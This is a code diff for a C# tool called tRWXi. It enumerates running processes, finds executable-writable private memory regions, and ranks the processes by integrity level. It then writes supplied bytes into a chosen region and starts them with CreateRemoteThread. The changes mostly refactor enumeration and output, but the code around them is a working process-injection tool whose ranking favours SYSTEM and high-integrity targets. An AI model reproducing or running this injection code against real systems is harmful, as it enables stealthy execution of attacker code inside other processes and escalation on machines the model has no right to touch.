@@ -4,8 +4,7 @@ using tRWXi.Data;
 using System.Runtime.InteropServices;
 using System.Linq;
 using tRWXi.Utils;
-using System.Net.Http.Headers;
-using System.Reflection;
+
 using static tRWXi.Utils.Win32;
 
 namespace tRWXi
@@ -29,30 +28,35 @@ namespace tRWXi
 
                 bool hResult = Win32.Process32First(hSnapshot, ref pe);
 
-                Dictionary<int, List<Data.ProcessMemoryInfo>> processes = new Dictionary<int, List<ProcessMemoryInfo>>();
+                Dictionary<ProcessInfo, List<ProcessMemoryInfo>> processes = new Dictionary<ProcessInfo, List<ProcessMemoryInfo>>();
 
                 IntPtr numberOfBytesWritten = IntPtr.Zero;
 
                 string integrityLevel = "";
 
+                int rank;
+
                 if (parameters.ContainsKey("enumerate"))
                 {
-                    Console.WriteLine("[!] Started enumeration");
+                    Console.WriteLine("[*] Started enumeration");
 
                     while (hResult)
                     {
                         IntPtr hProcess = Win32.OpenProcess(Win32.PROCESS_ALL_ACCESS, false, (int)pe.th32ProcessID);
+                        ProcessInfo pi = new ProcessInfo((int)pe.th32ProcessID);
 
                         while (Win32.VirtualQueryEx(hProcess, lpAddress, out mbi, Marshal.SizeOf(mbi)) != 0)
                         {
                             lpAddress = new IntPtr(mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
                             if (mbi.AllocationProtect == Win32.PAGE_EXECUTE_READ_WRITE && mbi.State == Win32.MEM_COMMIT && mbi.Type == Win32.MEM_PRIVATE)
                             {
-                                if (!processes.ContainsKey((int)pe.th32ProcessID))
+                                if (!processes.ContainsKey(pi))
                                 {
-                                    processes[(int)pe.th32ProcessID] = new List<ProcessMemoryInfo>();
+                                    processes[pi] = new List<ProcessMemoryInfo>();
                                 }
-                              
+
+                                pi.processName = pe.szExeFile;
+
                                 IntPtr hToken;
                                 unsafe
                                 {
@@ -88,26 +92,34 @@ namespace tRWXi
                                     {
                                         case >= (uint)Win32.IntegrityLevel.SystemIntegrity:
                                             integrityLevel = "SYSTEM";
+                                            rank = 0;
                                             break;
 
                                         case >= (uint)Win32.IntegrityLevel.HighIntegrity:
                                             integrityLevel = "High";
+                                            rank = 1;
                                             break;
 
                                         case >= (uint)Win32.IntegrityLevel.MediumIntegrity:
                                             integrityLevel = "Medium";
+                                            rank = 2;
                                             break;
 
                                         case >= (uint)Win32.IntegrityLevel.LowIntegrity:
                                             integrityLevel = "Low";
+                                            rank = 3;
                                             break;
 
                                         default:
                                             integrityLevel = "Untrusted";
+                                            rank = 4;
                                             break;
                                     }
 
-                                    processes[(int)pe.th32ProcessID].Add(new ProcessMemoryInfo((int)pe.th32ProcessID, pe.szExeFile, hProcess, mbi.BaseAddress, mbi.RegionSize, integrityLevel));
+                                    pi.rank = rank;
+                                    pi.integrityLevel = integrityLevel;
+
+                                    processes[pi].Add(new ProcessMemoryInfo(mbi.BaseAddress, mbi.RegionSize));
 
                                     Win32.LocalFree(p);
                                     CloseHandle(hToken);
@@ -151,13 +163,13 @@ namespace tRWXi
                             {
                                 data = new byte[] { };
                             }
-                            Console.WriteLine("[!] Started injection");
+                            Console.WriteLine("[*] Started injection");
                             Win32.WriteProcessMemory(hProcess, addr, data, data.Length, out numberOfBytesWritten);
                             Console.WriteLine(String.Format("[+] {0} bytes written into RWX region", numberOfBytesWritten));
                         }
                         else {}
 
-                        Console.WriteLine("[!] Starting execution...");
+                        Console.WriteLine("[*] Starting execution...");
                         IntPtr res = Win32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
 
                         if ((int)res != 0)
@@ -182,13 +194,14 @@ namespace tRWXi
 
                 if (parameters.ContainsKey("enumerate"))
                 {
-                    foreach (KeyValuePair<int, List<ProcessMemoryInfo>> kv in processes)
+                    var sortedProcesses = from entry in processes orderby entry.Key.rank descending select entry;
+
+                    foreach (KeyValuePair<ProcessInfo, List<ProcessMemoryInfo>> kv in sortedProcesses)
                     {
-                        string pName = kv.Value.First().processName;
-                        Console.WriteLine(String.Format("[+] {0} -> {1}: ", kv.Key, pName));
+                        Console.WriteLine(String.Format("[{0}] {1} -> {2}: ", kv.Key.integrityLevel, kv.Key.pid, kv.Key.processName));
                         foreach (ProcessMemoryInfo pmi in kv.Value)
                         {
-                            Console.WriteLine(String.Format("\t[{4}] handler::{0}\tbaseAddress:0x{1:X}\tsize::{3}", pmi.handler, pmi.baseAddress.ToInt64(), pmi.baseAddress, pmi.size, pmi.integrityLevel));
+                            Console.WriteLine(String.Format("\t\tbaseAddress:0x{0:X}\tsize::{1}", pmi.baseAddress.ToInt64(), pmi.size));
                         }
                     }
                 }
